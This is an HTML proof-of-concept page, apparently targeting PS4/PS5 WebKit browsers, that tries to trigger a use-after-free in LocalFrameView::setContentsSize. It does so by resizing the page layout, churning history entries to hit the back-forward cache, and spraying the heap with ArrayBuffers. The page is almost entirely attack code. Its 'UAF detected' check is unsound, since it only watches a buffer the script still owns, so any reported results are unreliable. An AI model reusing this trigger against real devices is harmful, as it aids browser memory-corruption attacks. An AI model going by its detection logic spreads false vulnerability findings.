<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FrameView UAF PoC (PS4/PS5?)</title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #console {
            margin-top: 10px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>FrameView UAF PoC</h1>
    <p>Click to test UAF in LocalFrameView::setContentsSize.</p>
    <button id="trigger">TEST UAF</button>
    <div id="status">Idle...</div>
    <div id="console"></div>
    <script>
        const status = document.getElementById('status');
        const consoleDiv = document.getElementById('console');
        let attemptCount = 0;

        function log(msg) {
            consoleDiv.append(msg + '\n');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function stressGC() {
            for (let i = 0; i < 500; i++) {
                new ArrayBuffer(1024 * 1024);
            }
            for (let i = 0; i < 100; i++) {
                new ArrayBuffer(2 * 1024 * 1024);
            }
        }

        function changeContentSize() {
            // Change document body size to trigger setContentsSize
            document.body.style.width = `${Math.random() * 1000 + 500}px`;
            document.body.style.height = `${Math.random() * 1000 + 500}px`;
            // Force layout
            document.body.offsetHeight;
        }

        function navigateHistory() {
            // Push multiple history states
            for (let i = 0; i < 5; i++) {
                history.pushState({ page: i }, `Page ${i}`, `#page${i}`);
            }
            // Navigate back to trigger BackForwardCache
            history.back();
        }

        function checkMemoryChanges() {
            // Create a test buffer to monitor memory
            const buffer = new ArrayBuffer(4096);
            const view = new Uint8Array(buffer);
            for (let i = 0; i < view.length; i++) {
                view[i] = 0x46; // Initial pattern
            }
            return () => {
                let changes = 0;
                const newValues = new Set();
                for (let i = 0; i < view.length; i++) {
                    if (view[i] !== 0x46) {
                        changes++;
                        newValues.add(view[i]);
                    }
                }
                return { changes, newValues: [...newValues] };
            };
        }

        async function detectUAF() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;
            log(`Attempt ${attemptCount} started`);

            try {
                // Create memory checker
                const check = checkMemoryChanges();

                // Stress heap and trigger navigation
                const interval = setInterval(() => {
                    changeContentSize();
                    navigateHistory();
                    stressGC();
                }, 100);

                // Check for memory changes
                setTimeout(() => {
                    clearInterval(interval);
                    const result = check();
                    if (result.changes > 0) {
                        status.textContent = `UAF detected! ${result.changes} bytes changed`;
                        log(`UAF detected! ${result.changes} bytes changed`);
                        log(`New values: ${result.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
                    } else {
                        stressGC();
                        setTimeout(() => {
                            const secondResult = check();
                            if (secondResult.changes > 0) {
                                status.textContent = `UAF detected after GC! ${secondResult.changes} bytes changed`;
                                log(`UAF detected after GC! ${secondResult.changes} bytes changed`);
                                log(`New values: ${secondResult.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
                            } else {
                                status.textContent = 'No UAF detected';
                                log('No UAF detected');
                            }
                        }, 10);
                    }
                }, 1000);
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        }

        document.getElementById('trigger').addEventListener('click', async () => {
            try {
                await detectUAF();
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
